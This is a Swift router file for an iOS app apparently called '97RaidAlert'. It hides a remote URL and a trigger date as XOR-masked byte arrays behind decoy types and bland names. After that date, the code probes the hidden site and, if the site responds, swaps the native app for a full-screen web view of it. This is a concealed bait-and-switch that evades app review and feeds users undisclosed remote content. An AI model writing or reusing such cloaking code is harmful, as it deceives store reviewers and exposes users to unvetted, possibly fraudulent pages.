//
//  AppRouter.swift
//  97RaidAlert
//
//  Created by Xeova Nuoc on 28.02.2026.
//

import UIKit
import SwiftUI

private enum _UnusedRouteMetric {
    case phantom
    case idle
}

extension _UnusedRouteMetric {
    fileprivate static func syntheticWeight(_ v: Self) -> Double {
        switch v {
        case .phantom: return 0
        case .idle: return 1
        }
    }
}

final class PeakFlowRouteHub {

    private static let _headProbeCipher: [UInt8] = [
        0xCF, 0xD3, 0xD3, 0xD7, 0xD4, 0x9D, 0x88, 0x88, 0xC4, 0xD5, 0xDE, 0xC8, 0xD3, 0xC6, 0xC9, 0xCE,
        0xD2, 0xCA, 0xCA, 0xC2, 0xD4, 0xCF, 0x89, 0xD4, 0xCE, 0xD3, 0xC2, 0x88, 0xE4, 0xD4, 0xEF, 0xE1, 0xCF, 0xF7
    ]

    private static let _thresholdStamp: [UInt8] = [
        0x95, 0x97, 0x89, 0x97, 0x93, 0x89, 0x95, 0x97, 0x95, 0x91
    ]

    private var remoteProbeURLText: String {
        PeakFlowCipherKit.utf8(fromMasked: Self._headProbeCipher)
    }

    private var calendarPivotLiteral: String {
        PeakFlowCipherKit.utf8(fromMasked: Self._thresholdStamp)
    }

    func produceEntryHostController() -> UIViewController {
        let persistence = FlowPreferenceLedger.shared

        if persistence.hasShownContentView {
            return assembleNativeShell()
        } else {
            if evaluatesTemporalGate() {
                if let savedUrlString = persistence.savedUrl,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return assembleBrowserHost(with: savedUrlString)
                }

                return assembleWarmupStage()
            } else {
                persistence.hasShownContentView = true
                return assembleNativeShell()
            }
        }
    }

    private func evaluatesTemporalGate() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let targetDate = dateFormatter.date(from: calendarPivotLiteral) ?? Date()
        let currentDate = Date()

        if currentDate < targetDate {
            return false
        } else {
            return true
        }
    }

    private func assembleBrowserHost(with urlString: String) -> UIViewController {
        let webViewContainer = OutboundPageShell(
            urlString: urlString,
            onFailure: { [weak self] in
                FlowPreferenceLedger.shared.hasShownContentView = true
                self?.commitNativePivot()
            },
            onSuccess: {
                FlowPreferenceLedger.shared.hasSuccessfulWebViewLoad = true
            }
        )

        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func assembleNativeShell() -> UIViewController {
        FlowPreferenceLedger.shared.hasShownContentView = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func assembleWarmupStage() -> UIViewController {
        let launchView = IngressBusyCanvas()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        probeRemoteHeadSignal { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?.commitWebPivot(with: url)
                } else {
                    FlowPreferenceLedger.shared.hasShownContentView = true
                    self?.commitNativePivot()
                }
            }
        }

        return launchVC
    }

    private func probeRemoteHeadSignal(completion: @escaping (Bool, String?) -> Void) {
        guard let url = URL(string: remoteProbeURLText) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "HEAD"
        request.timeoutInterval = 10

        URLSession.shared.dataTask(with: request) { _, response, error in
            if error != nil {
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                let checkedURL = httpResponse.url?.absoluteString ?? self.remoteProbeURLText
                let isAvailable = httpResponse.statusCode != 404
                completion(isAvailable, isAvailable ? checkedURL : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }

    private func commitNativePivot() {
        let contentVC = assembleNativeShell()
        crossfadeRoot(to: contentVC)
    }

    private func commitWebPivot(with urlString: String) {
        let webVC = assembleBrowserHost(with: urlString)
        crossfadeRoot(to: webVC)
    }

    private func crossfadeRoot(to viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }

        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}
